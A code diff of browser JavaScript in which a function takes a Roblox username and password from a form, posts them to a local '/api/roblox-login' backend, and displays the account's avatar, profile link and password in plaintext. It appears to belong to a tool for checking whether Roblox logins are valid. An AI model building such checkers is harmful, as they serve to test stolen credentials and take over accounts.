@@ -198,28 +198,48 @@ async function validateCredentials() {
   }
 }
 
-async function checkRobloxCredentials(username, password) {
+async function checkRobloxCredentials() {
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const results = document.getElementById('results');
+  const previewArea = document.getElementById('previewArea');
+  const debugLog = document.getElementById('debugLog');
+
+  results.innerHTML = '';
+  previewArea.classList.remove('hidden');
+  debugLog.textContent = '';
+
+  if (!username || !password) {
+    results.innerHTML = `<p class="profile-link red">Please enter both username and password.</p>`;
+    return;
+  }
+
   try {
-    const res = await fetch('/api/roblox-login', {
+    const response = await fetch('/api/roblox-login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password }),
+      body: JSON.stringify({ username, password })
     });
-    const data = await res.json();
 
-    // Example handling:
-    // success = true means login good
-    // success = false but reason might be action required (2FA, password reset)
+    const data = await response.json();
     if (data.success) {
-      return { username: data.username, password, userId: data.userId, success: true };
-    } else if (data.actionRequired) {
-      return { username, password, actionRequired: true, reason: data.reason };
+      results.innerHTML = `
+        <div class="result-card">
+          <img src="https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=150&height=150&format=png" alt="Avatar" />
+          <div>
+            <a class="profile-link green" href="https://www.roblox.com/users/${data.userId}/profile" target="_blank">
+              ${data.username}
+            </a>
+            <p class="password">Password: ${password}</p>
+          </div>
+        </div>
+      `;
     } else {
-      return { username, password, success: false };
+      results.innerHTML = `<p class="profile-link red">Invalid credentials.</p>`;
     }
   } catch (err) {
-    console.error(err);
-    return { username, password, success: false };
+    debugLog.textContent = `Error: ${err.message}`;
+    results.innerHTML = `<p class="profile-link red">Server error. See debug log.</p>`;
   }
 }
 
